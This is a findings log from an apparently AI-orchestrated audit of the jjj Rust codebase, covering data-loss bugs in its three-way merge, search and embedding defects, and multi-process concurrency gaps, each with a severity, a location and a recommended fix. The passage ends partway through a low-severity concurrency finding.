# jjj Codebase Audit — Findings Log

**Date:** 2026-05-30
**Scope:** Full project & codebase review/audit/critique → prioritized improvement plan
**Method:** 13-dimension multi-agent audit with adversarial verification of every medium+ finding, run via the Workflow orchestrator. This file is the raw findings log; the synthesized plan lives in `AUDIT_PLAN.md` (sibling file).

---

## Baseline health (collected before the audit)

| Signal | Value |
|---|---|
| Source size | ~27,826 LOC Rust across `src/` |
| Test size | ~8,565 LOC across `tests/` (30 files) + unit tests |
| Build | Clean (`cargo build`) |
| Tests | **527 passed, 0 failed, 1 ignored** across 32 test binaries (full capture, exit 0) |
| Clippy | ~25 style warnings (no errors). Categories: borrow-implements-traits (12), Default::default field-assign (5), manual prefix strip (4), map_or simplifiable (2), items-after-test-module (1) |
| `unwrap()` in src | ~161 |
| `expect()` in src | ~227 |
| `panic!`/`unreachable!`/`todo!` in src | ~9 |
| TODO/FIXME/HACK | 0 |

### Largest files (decomposition candidates)
- `src/tui/app/actions.rs` — 1930 LOC (the giant)
- `src/commands/solution.rs` — 1091
- `src/tui/tree.rs` — 1055
- `src/cli.rs` — 1044
- `src/commands/problem.rs` — 905
- `src/db/entities.rs` — 891
- `src/storage/mod.rs` — 889
- `src/commands/sync.rs` — 874
- `src/sync/github/mapping.rs` — 833
- `src/tui/app/mod.rs` — 830

---

## Audit dimensions (13)

1. Storage & three-way merge — data integrity (highest stakes)
2. DB / search / embeddings
3. Concurrency & data races
4. Error handling & panics
5. Security & injection
6. CLI structure & UX
7. TUI code quality
8. Ranking & voting math
9. Models, domain & invariants
10. Automation & GitHub sync
11. Test coverage & quality
12. Architecture & elegance
13. Docs accuracy & build hygiene

---

## Findings by dimension

Each medium+ finding carries an adversarial-verification verdict. Verifiers were genuinely skeptical: of 62 verified findings, **0 were rubber-stamped** as refuted-free — 41 confirmed, 21 marked _partial_ with corrections (several severity downgrades). Low/nit findings were not independently verified.

> **Verdict legend:** ✅ confirmed = real & accurately stated · 🟡 partial = real but mis-stated (corrected inline) · ❌ refuted = not real / not an improvement.


---

## 1. Storage & three-way merge

**Dimension summary:** The new three-way merge is well-structured: it operates on a generic serde_yml Value tree (so unknown/future YAML fields ARE preserved across merges — no field-drop risk), output keys are canonically sorted, timestamps are normalized to min/max, and the design is deterministic and commutative for the union cases. However, the base-snapshot LIFECYCLE is broken in a way that causes silent data loss: after a standalone `jjj fetch` (no push), the merge ancestor is overwritten with the MERGED-LOCAL content instead of the just-fetched remote, so on a subsequent fetch the local-only edits look like they are part of the base and get silently overwritten by a divergent remote edit. I proved this with an executable test. Two further data-integrity gaps: fetch never deletes entity files that were deleted on the remote (resurrection on next push), and body conflict markers pass validation and get pushed to the remote (conflict propagation). Several lower-severity issues exist around durability (no fsync in atomic_write), ordered-sequence reordering (critique replies / change_ids), and no-base global LWW. The merge algorithm core is sound; the surrounding lifecycle/plumbing is where the data-loss risk lives.


### 🔴 `CRITICAL` fetch overwrites merge ancestor with merged-local content, causing silent loss of local edits on the next fetch

**Category** correctness · **Effort** small · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/commands/fetch.rs:146 (snapshot_base) vs src/commands/fetch.rs:45 (write_base_file)`
- **Problem:** merge_entity_into_local correctly advances the per-file base to the just-fetched REMOTE content (line 45: write_base_file(base_path, relative, remote_content)). But after the loop, execute() calls snapshot_base(&meta_path, &base_path) at line 146, which wipes the entity dirs in base_path and re-mirrors them from meta_path — the MERGED-LOCAL result. The merge ancestor for the next fetch therefore becomes merged-local (which includes local-only edits the remote has never seen), not the remote state actually shared. On the next fetch, those local-only edits compare equal to base, so merge_value treats local as 'unchanged from base' and silently takes any divergent remote value. This is a real silent-data-loss path for the standalone `jjj fetch` command (mod.rs:81), which does not push afterward. (The combined `Sync` path, mod.rs:98-99, happens to push merged-local immediately so base=merged-local is coincidentally correct there — masking the bug in that one flow.)
- **Recommendation:** After fetch, the base must equal the remote content just merged in, not merged-local. Remove the trailing snapshot_base(&meta_path, &base_path) at fetch.rs:146 and rely solely on the per-file write_base_file(remote_content) already done at line 45 — but extend it so files present in base/local yet absent from the remote listing get their base entry removed (so a remote-side delete is reflected). Alternatively, keep a single explicit pass that copies each fetched remote file into base. Add a regression test for the two-fetch-without-push sequence.

### 🟠 `HIGH` fetch never deletes local entity files that were deleted on the remote; deleted entities resurrect on next push

**Category** correctness · **Effort** medium · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/commands/fetch.rs:98-127 (merge loop only iterates remote-listed files)`
- **Problem:** The fetch merge loop only walks files returned by `jj file list -r jjj <dir>/` and merges each into local. There is no pass that detects files which exist locally (and in the base) but are ABSENT from the remote listing — i.e. entities another user deleted. Such files are left untouched in .jj/jjj-meta. Because push (sync_meta_to_bookmark, push.rs:107-131) copies ALL local .md files back into the bookmark, the locally-retained file is re-pushed, resurrecting an entity that was intentionally deleted remotely. Combined with delete_problem's cascade (orphaning children, deleting solutions/critiques), this can also reintroduce dangling references.
- **Recommendation:** After collecting the remote file set per dir, enumerate local files in meta_path/<dir>; for any local file whose relative path was in the base snapshot but is NOT in the remote listing (remote deleted it) and which local has not re-created/edited since base, remove it locally (and from the cache). Edited-since-base local files should be kept (delete/edit conflict) and surfaced to the user.

### 🟠 `HIGH` Body conflict markers pass validation and are pushed to the remote, propagating the conflict to all clones

**Category** correctness · **Effort** small · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/storage/merge.rs:344-363 (merge_body) + src/commands/push.rs:220-235 (validate) + src/db/validate.rs:38-152`
- **Problem:** When both sides edit an entity body, merge_body wraps the whole body in `<<<<<<< local / ======= / >>>>>>> remote` markers and writes it into the .md body. fetch surfaces a warning, but nothing prevents the user from pushing the still-conflicted file. push.rs runs db::validate() before pushing, but validate only checks referential integrity (parent/milestone/problem/supersedes/solution refs + parent cycles) — it does not scan bodies for conflict markers. So a conflicted body is dumped into SQLite as the entity's description/approach/argument, passes validation, and is pushed to the remote bookmark, where every other clone then fetches the literal `<<<<<<<` markers as content.
- **Recommendation:** Add a validation rule that scans each entity body (and ideally raw .md files) for unresolved conflict markers ('<<<<<<< local', '>>>>>>> remote') and fails the push with a clear message until resolved. Optionally also block in commit_changes/save when a body contains markers. This converts a silent corruption-propagation into an actionable local error.

### 🟡 `MEDIUM` atomic_write performs no fsync of file or parent directory — rename durability is not guaranteed

**Category** correctness · **Effort** small · **Verdict** 🟡 **partial** (high conf) · **verifier re-rated → `low`**

- **Location:** `src/storage/mod.rs:19-29 (atomic_write)`
- **Problem:** atomic_write writes to a uniquely-named tmp then renames over the target. It never calls sync_data on the tmp file before rename, nor fsyncs the parent directory after rename. On a crash/power-loss between write and the OS flushing, the rename can be durable while the file's data blocks are not, yielding a zero-length or truncated metadata file — i.e. the very silent-corruption this layer is meant to prevent. The events.jsonl path (commit_changes, mod.rs:792) does call file.sync_data(), so the inconsistency is notable: the append-only log is fsynced but the canonical entity files are not.
- **Recommendation:** Open the tmp via File, write_all, sync_data, then rename, then fsync the parent directory (best-effort, ignore ENOTSUP). At minimum sync_data the tmp file before rename. This matches the durability already applied to events.jsonl.
- **Verifier correction:** Real durability gap, correct location, sound fix. Two corrections: (1) severity is low not medium — data is small, single-file, and reconstructible from the git-backed jjj bookmark; (2) the "silent-corruption this layer is meant to prevent" framing is inaccurate — atomic_write's documented purpose (mod.rs:15-18) is concurrent-writer atomicity, which rename preserves with or without fsync; crash durability is a separate property the doc never claims. The fix is still worth applying for consistency with the fsync already done on events.jsonl (mod.rs:792) and the PidLock (push.rs:36).

### 🟡 `MEDIUM` Ordered sequences (critique replies, change_ids) are reordered by content-sort during merge, corrupting order-dependent semantics

**Category** correctness · **Effort** medium · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/storage/merge.rs:270-298 (merge_sequence) — applies to Critique.replies and Solution.change_ids`
- **Problem:** merge_sequence treats every YAML sequence as an unordered set: base-retained items keep base order, but all NEW items (added on either side) are appended sorted by their serialized representation (additions.sort_by_key(key_of)). Several sequences are order-significant: Critique.replies is a discussion thread rendered in stored order and accessed via `.replies.last()` (critique.rs:466, tui/detail.rs:238), and Solution.change_ids treats `change_ids[0]` as the primary change (sync.rs:444, status.rs). After a merge that adds replies/change_ids on both sides, items are re-sorted by serialized YAML (which for Reply begins with `id:` like CQ-1-R1, CQ-1-R10, CQ-1-R2 — lexicographic, not chronological), so 'last reply' and 'primary change' can silently change. created_at exists on Reply but is not used as the sort key.
- **Recommendation:** Distinguish set-like fields (tags, solution_ids, critique_ids) from order-like fields (replies, change_ids). For replies, merge by reply id with conflict-free union but sort the final list by created_at (or keep base order then append new items in source order with a stable tiebreak). At minimum, sort additions by a chronological key rather than raw serialized bytes.

### 🟡 `MEDIUM` With no base snapshot, a single global updated_at winner overwrites every conflicting scalar — including fields the winning side never touched

**Category** correctness · **Effort** medium · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/storage/merge.rs:113,165-182,234-238 (pick_side + scalar fallback)`
- **Problem:** When base is None (new clone, missing/wiped jjj-meta-base, or first fetch), merge_value cannot do per-field three-way resolution, so any field that differs between local and remote falls through to the prefer side chosen once by pick_side (later updated_at, lex tiebreak). That single winner is applied to ALL diverging scalars. A field edited only on the losing side is silently overwritten by the winner's value. The base-snapshot bug above makes a missing/stale base more likely in practice, widening this window.
- **Recommendation:** Accept that no-base is inherently lossy, but reduce the blast radius: when base is None, fall back to per-field union/keep-both heuristics where possible, or surface a conflict for divergent scalars rather than silently dropping. More importantly, ensure base is rarely None by fixing the snapshot lifecycle (finding 1) and snapshotting base on init/clone.

### 🔵 `LOW` Base snapshot is skipped entirely when the jjj bookmark is absent, leaving a stale base for a later fetch

**Category** correctness · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/commands/fetch.rs:94-147 (entire merge+snapshot block is inside `if bookmark_exists("jjj")`)`
- **Problem:** All base-snapshot maintenance (write_base_file and the final snapshot_base) is gated on bookmark_exists("jjj"). If a fetch runs while the remote/local jjj bookmark is temporarily absent (e.g. tracking not yet established, transient jj state), no base is written or refreshed, so a previously-written base can become arbitrarily stale relative to local edits made in the meantime. A later fetch then three-way-merges against an outdated ancestor, which (per finding 6) can mis-resolve fields. Low likelihood but compounds the other base issues.
- **Recommendation:** Refresh the base snapshot from local meta on init and whenever the bookmark is missing, or at least document that base may be stale and treat a stale base conservatively (prefer surfacing conflicts over silent LWW).

### 🔵 `LOW` atomic_write tmp filename can collide between two saves of the same file in one process within the same nanosecond bucket

**Category** concurrency · **Effort** trivial · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/storage/mod.rs:20-25 (tmp name = path + process id + subsec_nanos)`
- **Problem:** The tmp filename uses process id + SystemTime subsec_nanos(). subsec_nanos resolution depends on the platform clock and can repeat across two very-rapid saves in the same process (same pid). Two concurrent in-process writers to the same target path could then pick the same tmp path and clobber each other's tmp before rename. The window is tiny (write immediately followed by rename) and the code is single-threaded in practice, so impact is minimal, but the comment claims this 'cannot' happen.
- **Recommendation:** Add a process-local atomic counter (AtomicU64::fetch_add) or a few random bytes to the tmp suffix so uniqueness does not depend on clock resolution. Trivial change that makes the comment's guarantee actually hold.


---

## 2. DB / search / embeddings

**Dimension summary:** The SQLite layer is correctly framed as a derived cache: markdown is canonical, the DB is dropped/rebuilt from files, a dirty flag guards interrupted bulk loads, migrations fall back to a full rebuild on any error, and f32 vector blob round-tripping is correct and well-tested. However, there is one serious lifecycle bug that effectively breaks semantic/hybrid search and embedding-based duplicate detection: load_from_markdown (run on nearly every command, including plain `jjj search`) clears the embeddings table but never recomputes it, so embeddings only survive until the next search/fetch. Compounding this, the FTS search path does no relevance ranking despite its docstring (no ORDER BY rank/bm25), and the cross-type result truncation is unfair and contradicts both the docstring and the project memory note. The hand-rolled Ollama HTTP client is mostly fine for the happy path but its "handles chunked TE safely" claim is false. Several medium correctness/robustness gaps round it out (silent dimension-mismatch in similarity, no schema-drift detection vs. column set). No SQL-injection risk: the one format!()-built DELETE uses a hardcoded table whitelist and a bound parameter.


### 🟠 `HIGH` Every search/fetch wipes embeddings but never recomputes them, silently disabling semantic & hybrid search

**Category** bug · **Effort** medium · **Verdict** 🟡 **partial** (high conf)

- **Location:** `src/db/sync.rs:437-447 (clear_all_tables) + src/commands/search.rs:22-23 + src/commands/search.rs:110-126`
- **Corrected location:** Wipe: src/db/sync.rs:439 (clear_all_tables) via sync.rs:34 (load_from_markdown). Only recompute: src/commands/db.rs:121. Search read of empty table: src/commands/search.rs:23 then :113. Misleading label: src/commands/search.rs:144-148. Duplicate check (no own wipe): src/commands/problem.rs:715-748.
- **Problem:** load_from_markdown() calls clear_all_tables(), which executes `DELETE FROM embeddings` (sync.rs:439), but load_from_markdown does NOT recompute embeddings — only rebuild_fts is run afterward (sync.rs:73). `jjj search` calls load_from_markdown on EVERY invocation (search.rs:23) and only THEN runs execute_hybrid_search, which queries similarity_search against the now-empty embeddings table. The same wipe happens on `jjj fetch` (fetch.rs:160), `jjj init` (init.rs:17), `problem list --search`, `solution list --search`, and on each entity-create path that calls load_from_markdown. Net effect: embeddings exist only immediately after `jjj db rebuild`; the very next search (or fetch, or list --search) empties them, so hybrid search permanently degrades to FTS-only and the semantic duplicate check at problem creation (problem.rs:114 -> check_for_duplicates -> similarity_search) silently finds nothing. The '(hybrid)' label still prints, masking the failure.
- **Recommendation:** Do not delete embeddings during the generic markdown reload, since they are expensive to recompute and the markdown reload doesn't recompute them. Either (a) drop `DELETE FROM embeddings` from clear_all_tables and let upsert/delete keep them in step (handling stale rows when an entity disappears), or (b) after load_from_markdown, re-derive embeddings incrementally for changed entities, or (c) at minimum have the search command opportunistically call rebuild_embeddings when the embeddings table is empty but a client is available. Add a test asserting that embeddings survive a load_from_markdown round-trip.
- **Verifier correction:** Correction: entity-CREATE paths do NOT wipe embeddings (they use sync_*_to_cache, sync.rs:229+, which leave the embeddings table untouched). The wipe is on read/maintenance paths: search, fetch, init, and problem/solution `list --search` and critique. The duplicate check at problem creation does find nothing, but only because a prior load_from_markdown-calling command emptied the table — not because `problem new` wipes it. Everything else in the finding is confirmed: DELETE FROM embeddings, no recompute outside `db rebuild`, similarity_search reading the empty table, and the unconditional "(hybrid)" label masking the degradation.

### 🟠 `HIGH` FTS search does no relevance ranking despite docstring; RRF rank input is meaningless

**Category** correctness · **Effort** medium · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/db/search.rs:66-193 (each per-type query) and search.rs:357-413 (merge_with_rrf)`
- **Problem:** The docstring (search.rs:29) says 'Uses FTS5 MATCH query with ranking by relevance', but none of the four per-type SQL statements have `ORDER BY rank` or use `bm25()`. Each is `SELECT ... WHERE id IN (SELECT entity_id FROM fts WHERE fts MATCH ?1)`, returning rows in arbitrary SQLite order (effectively rowid/insertion order of the base table). The combined results are then `truncate(50)`'d (search.rs:190). Because results are unordered, merge_with_rrf's `for (rank, result) in fts_results.iter().enumerate()` (search.rs:369) assigns RRF ranks based on insertion order, not relevance — so the FTS half of the rank fusion is noise. This degrades both plain FTS results and the hybrid ranking.
- **Recommendation:** Rank inside SQL using FTS5 bm25: e.g. `SELECT p.id, p.title, p.description FROM problems p JOIN fts f ON f.entity_id = p.id WHERE f.fts MATCH ?1 ORDER BY f.rank LIMIT N` (rank is ascending = best first in FTS5). Then the enumerate()-based RRF rank becomes meaningful. Update or remove the 'ranking by relevance' docstring if not implemented.

### 🟡 `MEDIUM` Cross-type result truncation is unfair and contradicts docstring/memory note

**Category** correctness · **Effort** medium · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/db/search.rs:65-192`
- **Problem:** search() appends ALL problem matches, then ALL solution matches, then critiques, then milestones, and finally `results.truncate(50)` (search.rs:190). The docstring (search.rs:33-36) claims 'results are drawn from all types before truncation so no single type monopolises the output', but there is no per-type cap or interleaving. With 60 matching problems, problems consume all 50 slots and solutions/critiques/milestones are never shown. This directly contradicts the project MEMORY note ('removed per-type SQL LIMIT so final truncation gives fair distribution') — removing the per-type LIMIT made distribution LESS fair, not more, when one type dominates.
- **Recommendation:** Either reinstate a per-type cap (e.g. 50/4 each, then top up), or collect per-type Vecs and round-robin interleave before truncation, or rank globally by bm25 across types. Fix the docstring to match whichever behavior is chosen.

### 🟡 `MEDIUM` Model/dimension change makes semantic search silently return zeros instead of detecting stale embeddings

**Category** correctness · **Effort** small · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/db/search.rs:298-313 + src/embeddings.rs:271-292`
- **Corrected location:** src/db/search.rs:298-313 + src/embeddings.rs:271-292 (schema columns at schema.sql:119-120, not 118-120)
- **Problem:** similarity_search computes cosine_similarity(query_embedding, &e.embedding) for every stored embedding. cosine_similarity returns 0.0 when `a.len() != b.len()` (embeddings.rs:272). If the user switches embedding models (e.g. 4096-dim qwen3 -> 768-dim model) without running `jjj db rebuild`, the stored embeddings keep the old dimension while the query embedding has the new dimension; every pair mismatches, every similarity is 0.0, and results come back ranked by accident (all-equal) or empty — with no error or warning. The embeddings table even stores a `dimensions` column and `model` column that could detect this, but neither similarity_search nor the search command checks model/dimension agreement.
- **Recommendation:** Before similarity_search, compare the active client.model()/client.dimensions() against get_embedding_model()/stored dimensions; if they differ, either trigger a rebuild or skip semantic search with a clear warning rather than silently returning zeros.

### 🟡 `MEDIUM` HTTP client comment claims chunked transfer-encoding is handled, but it is not

**Category** correctness · **Effort** small · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/embeddings.rs:200-211`
- **Problem:** The comment at embeddings.rs:200-201 says 'use Content-Length if available (handles chunked TE safely), otherwise fall back to read_to_string'. There is no Transfer-Encoding parsing anywhere in http_post (confirmed by grep — only Content-Length is extracted). If the server responds with `Transfer-Encoding: chunked` and omits `Content-Length` (a server is free to do this regardless of the client's `Connection: close` request header), the else branch reads the raw chunked framing (hex size lines + CRLF delimiters interleaved with the body) into response_body, and serde_json::from_str then fails with a confusing parse error. It happens to work today only because Ollama returns Content-Length for non-streaming /v1/embeddings.
- **Recommendation:** Either implement minimal chunked decoding (read size line as hex, read that many bytes + CRLF, repeat until a 0-size chunk) when `Transfer-Encoding: chunked` is present, or change the comment to state honestly that only Content-Length responses are supported and return a clear EmbeddingError if neither Content-Length nor a parseable body is present.

### 🔵 `LOW` No schema-drift detection: a DB at the right version but wrong column set is trusted

**Category** design · **Effort** small · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/db/schema.rs:51-128 (needs_rebuild / ensure_schema)`
- **Problem:** needs_rebuild()/ensure_schema() decide correctness purely from the integer schema_version in meta plus the dirty flag. There is no validation that the actual table/column set matches schema.sql. The migration registry also has version gaps (3,4,5,7,8,9 — 1,2,6 absent), which is harmless for the linear `version <= current` loop but means a DB stamped with an out-of-band version (e.g. a future/forked build, or a meta row written by a different jjj version) could be trusted with a mismatched schema, and queries like SELECT description/argument would then error at runtime rather than triggering a rebuild. Because the DB is a pure derived cache, a cheap defensive option exists. Note: validate.rs implements integrity checks but is not invoked from the open path.
- **Recommendation:** Consider a lightweight self-check (e.g. run a representative SELECT or PRAGMA table_info on open and rebuild on any error), or wire db::validate into the open/status path. Given the cache is always reconstructable from markdown, defaulting to rebuild-on-any-doubt is safe and cheap.

### 🔵 `LOW` Incremental cache writes (sync_*_to_cache) never update embeddings or detect their staleness

**Category** design · **Effort** medium · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/db/sync.rs:229-274 + src/storage/mod.rs:281,306`
- **Problem:** sync_problem_to_cache / sync_solution_to_cache / sync_critique_to_cache / sync_milestone_to_cache keep the entity row and FTS entry in step on each save, but never touch the embeddings table. So after editing a problem's title/description, its FTS entry updates while its embedding (if any) becomes stale, and a newly created entity has no embedding until the next full `jjj db rebuild`. This is partly masked by the higher-severity wipe bug above, but is an independent gap: even if embeddings weren't being wiped, incremental edits would silently drift the semantic index out of sync with content.
- **Recommendation:** If semantic search is meant to stay fresh between rebuilds, recompute the single entity's embedding in the sync_*_to_cache hooks when an embedding client is available (best-effort), or document that embeddings are rebuild-only and surface staleness in `jjj db status` (e.g. embeddings older than newest entity updated_at).


---

## 3. Concurrency & data races

**Dimension summary:** jjj's three-way merge (src/storage/merge.rs) is the strongest part of the concurrency story: it cleanly reconciles cross-user edits to entity files via set-union on sequences and LWW-with-conflict-markers on bodies, and the per-file atomic_write (tmp+rename) prevents torn single-file writes. But the same-machine, multi-process story (CLI + TUI, or two CLI invocations) is largely unprotected. The only cross-process lock in the codebase is the push PidLock; there is no locking around the entity-file read-modify-write paths, the events.jsonl append, the per-user ranking files, the base-snapshot directory, or the SQLite cache. Concrete consequences: lost updates on back-reference fields (problem.solution_ids, milestone.problem_ids, child orphaning) when two local processes mutate the same file concurrently; a corruptible/partially-truncated events.jsonl on large multi-event commits; SQLite "database is locked" errors with no busy_timeout/WAL when the TUI and a CLI touch jjj.db at once; and silent loss of ranking files which are never synced by push/fetch at all. Several of these are realistic in normal multi-user/multi-tool usage and warrant fixes.


### 🟠 `HIGH` Per-user ranking files are never synced by push/fetch and are written non-atomically

**Category** concurrency · **Effort** medium · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/ranking/ordering.rs:88-103 (save_user_ordering); src/commands/push.rs:107; src/commands/fetch.rs:98; src/storage/mod.rs:45 (ENTITY_DIRS)`
- **Problem:** The `rankings/{milestone_id}/{user}.json` files hold each user's priority ordering and quadratic-vote allocations — genuine shared collaborative state. They are excluded from every sync and merge path: push.rs only copies `["problems","solutions","critiques","milestones"]` (plus config/events) into the sync workspace, fetch.rs only merges those same four dirs, and `ENTITY_DIRS` (used by snapshot_base and the merge ancestor) does not include `rankings`. So rankings never reach the remote and never come back — global ranking aggregation (Borda + QV across all users) silently sees only the local user's file. Separately, `save_user_ordering` uses a plain `fs::write` rather than the `atomic_write` (tmp+rename) used for entity files, so a crash or concurrent writer mid-write can truncate the JSON; a partial write makes `load_user_ordering`/`load_all_orderings` fail to deserialize, dropping that user's entire ordering.
- **Recommendation:** Add a `rankings/` sync path: copy it into the sync workspace in push.rs and reconcile it in fetch.rs. Since each user owns a distinct `{user_slug}.json` file, a simple per-file last-writer-wins union (adopt remote files the local doesn't have, keep local's own file) avoids cross-user conflicts entirely — no three-way merge needed because users never edit each other's files. Switch `save_user_ordering` to use the same atomic tmp+rename helper as entity files (expose `atomic_write` or duplicate the pattern in ordering.rs).

### 🟠 `HIGH` SQLite cache opened without WAL or busy_timeout — TUI/CLI concurrent access throws 'database is locked'

**Category** concurrency · **Effort** small · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/db/schema.rs:25-30 (Database::open)`
- **Problem:** `Database::open` calls `Connection::open(path)` and sets no pragmas — no `journal_mode=WAL`, no `busy_timeout`. SQLite's default rollback-journal mode takes a reserved/exclusive lock for any write and serializes readers against writers. jjj routinely has two processes hitting `.jj/jjj.db` at once: a long-lived TUI session (which syncs to the cache on every save during refresh_data) and a CLI invocation in another terminal (every `save` calls `entity.sync_to_cache`). With no `busy_timeout`, the loser of any lock race gets an immediate `SQLITE_BUSY` rather than waiting. In the save path that surfaces only as a warning (`storage/mod.rs:469-478` 'cache sync failed'), silently desyncing the cache from the markdown; but read paths (`query_ids_or_fallback`, search, `db rebuild`, fetch's full rebuild that deletes+recreates the file) can hard-fail or, worse, the fetch rebuild (`fetch.rs:155-160` removes the .db while another process holds an open connection to it) leaves the other process operating on a deleted inode.
- **Recommendation:** In `Database::open`, immediately after opening set `conn.busy_timeout(Duration::from_secs(5))` and `conn.pragma_update(None, "journal_mode", "WAL")?` (WAL allows concurrent readers during a writer and is far more robust for this multi-process pattern). The cache is a derived index so WAL's relaxed durability is acceptable. Additionally, guard the fetch rebuild so it does not unlink the DB out from under live readers — rebuild into a temp DB and rename, or hold a lock.

### 🟠 `HIGH` Lost updates on entity back-reference fields under concurrent local processes (no locking on read-modify-write)

**Category** concurrency · **Effort** medium · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/commands/solution.rs:245-250; src/storage/problems.rs:48-128 (delete_problem); src/domain.rs:83-98`
- **Problem:** Many operations are load-mutate-save on a *shared* file with no lock. Creating a solution does `load_problem(problem_id)` → `problem.add_solution(id)` → `save_problem` (solution.rs:245-250). If two users/processes create solutions against the same problem at the same time on the same machine, both read the problem before either writes; the second save clobbers the first's `solution_ids` entry (and any status change). atomic_write only guarantees the file isn't *torn* — it does nothing about the read-modify-write window. The cross-machine variant is saved by merge.rs's sequence set-union, but same-machine concurrency never goes through merge. The same lost-update window exists in delete_problem (orphaning children, removing solutions/critiques, updating the milestone are a non-atomic multi-file sequence) and in domain.rs approve/auto-solve (re-loads solution and problem inside with_metadata but with no lock, so a concurrent edit between the outer load at domain.rs:37 and the inner load at :83 is silently lost).
- **Recommendation:** Acquire a per-repo (or at minimum per-entity-file) advisory lock around the metadata mutation critical section. The simplest robust fix is a single repo-wide `.jj/jjj-meta/.write.lock` taken via the existing PidLock pattern (or, better, a real `flock`/`fs2`-style exclusive lock that auto-releases on process death to avoid the stale-lock problem the PidLock has) held for the duration of `with_metadata`. This serializes all local writers, eliminating the RMW window without changing the file format.

### 🟡 `MEDIUM` events.jsonl multi-event append is not atomic across processes — can interleave/corrupt on large commits

**Category** concurrency · **Effort** small · **Verdict** 🟡 **partial** (high conf) · **verifier re-rated → `low`**

- **Location:** `src/storage/mod.rs:760-798 (commit_changes)`
- **Corrected location:** commit_changes at src/storage/mod.rs:760-798 (esp. :791); silent drop at src/storage/events.rs:29 (NOT src/commands/events.rs:29)
- **Problem:** commit_changes serializes all pending events into one buffer and does a single `file.write_all(buf)` in O_APPEND mode. POSIX guarantees an append `write()` is atomic relative to other appenders only up to PIPE_BUF (commonly 4096 bytes) for regular files, and even that guarantee is not portable for ordinary files. A single jjj operation can queue multiple events (e.g. approve_solution queues SolutionApproved + ProblemSolved; solution-create can queue several), and event JSON lines with rationale/extra fields can be long, so the combined buffer can exceed 4 KiB. When two processes flush concurrently, write_all may be split into multiple syscalls and the OS can interleave another process's append between them, producing a physically interleaved/half-written line. list_events (events.rs:26-30) silently `filter_map`s away unparseable lines, so a corrupted event is silently dropped rather than detected — masking the data loss.
- **Recommendation:** Either (a) hold the same repo-wide write lock proposed above around commit_changes, or (b) write each event line with its own `write_all` of a sub-PIPE_BUF line (still imperfect but better), or (c) make list_events surface a warning when a line fails to parse instead of silently dropping it, so corruption is at least observable. (a) is the durable fix.
- **Verifier correction:** The data race and silent-drop masking are real, but the PIPE_BUF/O_APPEND justification is technically wrong: O_APPEND regular-file writes are atomic per syscall on Linux/macOS regardless of size; the real (lower-probability) risk is interleaving between the multiple write() syscalls that std's write_all may emit on a short write. The >4KiB trigger framing is incorrect. Practical likelihood is low, which is why I'd nudge severity to low. The most cost-effective concrete fix is option (c) (make list_events in src/storage/events.rs surface a warning on parse failure) plus, if hardening fully, option (a) a shared advisory lock around commit_changes mirroring the existing PidLock in push.rs.

### 🟡 `MEDIUM` base-snapshot directory has a wipe-then-repopulate window with no lock; concurrent fetch/push corrupts the merge ancestor

**Category** concurrency · **Effort** medium · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/storage/merge.rs:44-68 (snapshot_base); src/commands/push.rs:273-275; src/commands/fetch.rs:146`
- **Problem:** snapshot_base first `fs::remove_dir_all`s each entity dir under base_path, then recreates and copies files in. It is called by push (push.rs:275, outside the PidLock which is dropped at the end of sync_meta_to_bookmark) and by fetch (fetch.rs:146, which holds no lock at all). If a fetch runs while a push is snapshotting (or two fetches overlap), one process can observe the base in its emptied intermediate state: the next three-way merge then sees `base = None` for files whose ancestor was momentarily deleted, which downgrades a clean LWW resolution into spurious conflict markers (merge.rs:96-103 / merge_body:356-362 treat missing base as 'both diverged'). The result is false conflicts written into users' entity bodies. fetch takes no lock whatsoever, so it can also race a concurrent local entity write: it reads local file, merges, and `fs::write`s the result (fetch.rs:39, non-atomic write, not atomic_write), clobbering a concurrent save.
- **Recommendation:** Extend the PidLock (or the proposed repo-wide write lock) to cover the entire fetch operation and the push snapshot step, so snapshot_base and entity merges never overlap another sync or a local writer. Make snapshot_base atomic by building into `base_path.tmp` and renaming over `base_path`. Use atomic_write for the merged entity files in fetch.rs:39.

### 🟡 `MEDIUM` PidLock leaves stale locks on crash, requiring manual rm; no liveness check

**Category** concurrency · **Effort** small · **Verdict** ✅ **confirmed** (high conf)

- **Location:** `src/commands/push.rs:20-58 (PidLock)`
- **Problem:** PidLock uses O_EXCL file creation and removes the file on Drop. If the process is killed (SIGKILL, panic-abort, power loss) the Drop never runs and the lock file persists, permanently blocking all future pushes until the user manually deletes `.jj/jjj-meta/.push.lock`. The lock stores a PID but never checks whether that PID is still alive, so it cannot self-heal even though it has the information to (it could `kill(pid, 0)` and reclaim if dead). The doc comment acknowledges this ('Stale locks ... require the user to rm the file manually'), but for an offline-first tool meant to be ergonomic, a wedged push after any crash is a real usability/availability hazard.
- **Recommendation:** On AlreadyExists, read the stored PID and check liveness (on Unix, `libc::kill(pid, 0)` returning ESRCH means dead). If the holder is gone, reclaim the lock. Alternatively switch to an OS advisory lock (flock via the `fs2`/`fd-lock` crate, or `rustix`) which the kernel releases automatically on process exit, eliminating stale locks entirely.

### 🔵 `LOW` atomic_write temp-name collision is possible: two writers can pick the same pid+nanos suffix

**Category** concurrency · **Effort** trivial · **Verdict** — _(low/nit, not independently verified)_

- **Location:** `src/storage/mod.rs:19-29 (atomic_write)`
